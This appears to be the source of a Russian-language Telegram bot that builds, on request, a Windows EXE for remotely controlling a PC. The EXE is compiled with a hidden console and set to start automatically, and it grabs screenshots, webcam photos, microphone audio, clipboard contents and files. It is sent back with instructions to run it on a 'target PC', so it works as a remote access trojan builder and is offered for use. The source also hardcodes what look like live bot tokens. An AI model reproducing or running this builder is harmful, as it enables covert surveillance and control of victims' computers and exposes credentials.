import os
import subprocess
import asyncio
import time
import shutil
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton

TOKEN = "8600918837:AAGTp1wqCzA8TxOC37CWHAXWvbmc2p5IZFM"
bot = Bot(token=TOKEN)
dp = Dispatcher()


@dp.message(Command("start"))
async def start(message: types.Message):
    await message.answer(
        "👋 Привет! Я Билдер ботов для управления ПК.\n"
        "Я могу создать для тебя готовый .exe файл твоего бота.\n\n"
        "📋 <b>Возможности создаваемого бота:</b>\n"
        "├─ 📸 Скриншоты экрана\n"
        "├─ 📹 Фото с веб-камеры\n"
        "├─ 🎤 Запись звука с микрофона\n"
        "├─ 💻 Информация о системе (CPU, RAM, диск)\n"
        "├─ 📊 Мониторинг ресурсов\n"
        "├─ 🔊 Управление громкостью Windows\n"
        "├─ ⌨️ Ввод текста с клавиатуры\n"
        "├─ 🖱️ Управление мышью\n"
        "├─ 🪟 Управление окнами\n"
        "├─ ⚙️ Выключение/перезагрузка/сон\n"
        "├─ 📋 Буфер обмена\n"
        "├─ 📁 Проводник файлов\n"
        "└─ 🔄 Автозагрузка при старте Windows\n\n"
        "⚡ <b>Сборка: 30-60 секунд</b>\n\n"
        "🔧 <b>Просто отправь мне токен своего бота</b>\n"
        "и я создам для тебя готовый EXE файл!\n\n"
        "🗑 <b>/clean</b> — удалить все временные файлы\n\n"
        "⚠️ <b>Важно:</b> Никому не передавай этот токен!",
        parse_mode="HTML"
    )


@dp.message(Command("clean"))
async def clean_cmd(message: types.Message):
    """Удаляет все временные файлы сборки."""
    import glob
    
    confirm_msg = await message.answer("⏳ <b>Проверяю файлы...</b>", parse_mode="HTML")
    
    build_dirs = glob.glob("build_*")
    temp_files = glob.glob("*.spec")
    
    if not build_dirs and not temp_files:
        await confirm_msg.edit_text("✅ <b>Очистка не требуется!</b>\n\nВременные файлы не найдены.", parse_mode="HTML")
        return
    
    total_size = 0
    for d in build_dirs:
        for root, dirs, files in os.walk(d):
            for f in files:
                total_size += os.path.getsize(os.path.join(root, f))
    
    size_str = f"{total_size / (1024 * 1024):.1f} МБ"
    
    await confirm_msg.edit_text(
        f"🗑 <b>Найдено файлов для удаления:</b>\n\n"
        f"📁 <b>Папок:</b> {len(build_dirs)}\n"
        f"📄 <b>Файлов:</b> {len(temp_files)}\n"
        f"📊 <b>Общий размер:</b> {size_str}\n\n"
        "⏳ <b>Удаляю...</b>",
        parse_mode="HTML"
    )
    
    for d in build_dirs:
        try:
            shutil.rmtree(d)
        except Exception:
            pass
    
    for f in temp_files:
        try:
            os.remove(f)
        except Exception:
            pass
    
    await confirm_msg.edit_text("✅ <b>Очистка завершена!</b>\n\nВсе временные файлы удалены.", parse_mode="HTML")


@dp.message(F.text.startswith("http"))
async def not_token(message: types.Message):
    await message.answer(
        "❌ <b>Это не токен!</b>\n\n"
        "Токен выглядит как: <code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
        "🔑 Возьми токен у @BotFather в Telegram",
        parse_mode="HTML"
    )


@dp.message(F.text.count(":") == 1 and F.text.split(":")[0].isdigit())
async def build_bot(message: types.Message):
    token = message.text.strip()
    user_id = message.from_user.id

    if len(token.split(":")[0]) < 5 or len(token.split(":")[1]) < 10:
        await message.answer(
            "❌ <b>Неверный формат токена!</b>\n\n"
            "Токен должен выглядеть как:\n"
            "<code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
            "🔑 Возьми токен у @BotFather",
            parse_mode="HTML"
        )
        return

    status_msg = await message.answer(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[          ] 0%</code>\n\n"
        "📦 <b>Шаг 1/4:</b> Копирую шаблон...",
        parse_mode="HTML"
    )

    work_dir = f"build_{user_id}_{int(time.time())}"
    if not os.path.exists(work_dir):
        os.makedirs(work_dir)

    # Копируем main.py из текущей папки
    template_path = "main.py"
    if not os.path.exists(template_path):
        await status_msg.edit_text(
            "❌ <b>Ошибка!</b>\n\n"
            "Файл <code>main.py</code> не найден в папке билдера.\n\n"
            "Положи файл main.py в ту же папку где запущен builder.py",
            parse_mode="HTML"
        )
        return
    
    # Копируем файл
    shutil.copy2(template_path, os.path.join(work_dir, "main.py"))
    
    # Заменяем токен и MY_ID в скопированном файле
    with open(os.path.join(work_dir, "main.py"), "r", encoding="utf-8") as f:
        bot_code = f.read()
    
    bot_code = bot_code.replace('TOKEN = "8736760043:AAFymNRqvbZZiUABNb3-ZwJMneU1ndaJa2U"', f'TOKEN = "{token}"')
    bot_code = bot_code.replace('MY_ID = 1455766271', f'MY_ID = {user_id}')
    
    with open(os.path.join(work_dir, "main.py"), "w", encoding="utf-8") as f:
        f.write(bot_code)

    await status_msg.edit_text(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[===>      ] 25%</code>\n\n"
        "📦 <b>Шаг 2/4:</b> Устанавливаю зависимости...",
        parse_mode="HTML"
    )
    
    with open(os.path.join(work_dir, "requirements.txt"), "w", encoding="utf-8") as f:
        f.write("aiogram>=3.0.0\npyautogui\nopencv-python\npsutil\npyperclip\nsounddevice\nscipy\npycaw; sys_platform == 'win32'\ncomtypes; sys_platform == 'win32'\n")

    subprocess.run(
        ["pip", "install", "-r", "requirements.txt", "-q"],
        cwd=work_dir,
        check=True,
        capture_output=True
    )

    await status_msg.edit_text(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[=======>  ] 50%</code>\n\n"
        "🔨 <b>Шаг 3/4:</b> Компилирую в EXE...\n"
        "⏱️ Это займёт 30-60 секунд.",
        parse_mode="HTML"
    )

    log_path = os.path.join(work_dir, "pyinstaller.log")
    with open(log_path, "w", encoding="utf-8") as log_file:
        try:
            proc = subprocess.Popen([
                "pyinstaller",
                "--onefile",
                "--noconsole",
                "--hidden-import=cv2",
                "--hidden-import=pyautogui",
                "--hidden-import=aiogram",
                "--hidden-import=psutil",
                "--hidden-import=pyperclip",
                "main.py"
            ], cwd=work_dir, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            
            stages = [
                (65, "🔨 Анализирую модули..."),
                (75, "📦 Собираю библиотеки..."),
                (85, "🗜️ Упаковываю в EXE..."),
                (95, "✅ Финализирую..."),
            ]
            stage_idx = 0
            
            for line in proc.stdout:
                log_file.write(line)
                log_file.flush()
                
                if stage_idx < len(stages):
                    percent, text = stages[stage_idx]
                    if any(kw in line.lower() for kw in ["analyzing", "building", "collecting", "copying", "building pkg", "building exe"]):
                        bars = "=" * (percent // 10)
                        spaces = " " * (10 - len(bars))
                        await status_msg.edit_text(
                            "🛠 <b>Собираю бота...</b>\n\n"
                            f"📊 <b>Прогресс:</b>\n"
                            f"<code>[{bars}{spaces}] {percent}%</code>\n\n"
                            f"{text}",
                            parse_mode="HTML"
                        )
                        stage_idx += 1
            
            proc.wait()
            
            if proc.returncode != 0:
                with open(log_path, "r", encoding="utf-8") as lf:
                    error_log = lf.read()
                print(f"PyInstaller ERROR:\n{error_log}")
                raise Exception(f"PyInstaller вернул код {proc.returncode}")
                
        except subprocess.TimeoutExpired:
            await status_msg.edit_text(
                "❌ <b>Таймаут сборки!</b>\n\n"
                "PyInstaller работает слишком долго.",
                parse_mode="HTML"
            )
            return
        except Exception as e:
            await status_msg.edit_text(
                f"❌ <b>Ошибка сборки:</b> {e}",
                parse_mode="HTML"
            )
            return

    await status_msg.edit_text(
        "🛠 <b>Собираю бота...</b>\n\n"
        "📊 <b>Прогресс:</b>\n"
        "<code>[==========] 100%</code>\n\n"
        "✅ <b>Сборка завершена!</b>",
        parse_mode="HTML"
    )

    exe_path = os.path.join(work_dir, "dist", "main.exe")
    if os.path.exists(exe_path):
        final_exe_name = f"BotForPC_{user_id}.exe"
        final_exe_path = os.path.join(work_dir, final_exe_name)
        shutil.copy(exe_path, final_exe_path)
        
        exe_size = os.path.getsize(final_exe_path) / (1024 * 1024)

        # Отправляем в Telegram (лимит 50 МБ)
        await status_msg.delete()
        await message.answer_document(
            types.FSInputFile(final_exe_path),
            caption=(
                f"✅ <b>Бот готов!</b>\n\n"
                f"📦 <b>Размер:</b> {exe_size:.1f} МБ\n\n"
                "📋 <b>Инструкция:</b>\n"
                "1. Сохрани файл\n"
                "2. Запусти на целевом ПК\n"
                "3. Бот добавится в автозагрузку\n\n"
                "⚠️ Windows может спросить разрешение — разреши."
            ),
            parse_mode="HTML"
        )
    else:
        await status_msg.edit_text(
            "❌ <b>Ошибка!</b>\n\n"
            "Не удалось найти .exe файл.",
            parse_mode="HTML"
        )


@dp.message(F.text)
async def text_handler(message: types.Message):
    await message.answer(
        "🤔 <b>Я не понял...</b>\n\n"
        "🔧 <b>Отправь мне токен бота</b> в формате:\n"
        "<code>1234567890:ABCdefGHIjklMNOpqrsTUVwxyz</code>\n\n"
        "🔑 Токен можно получить у @BotFather",
        parse_mode="HTML"
    )


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
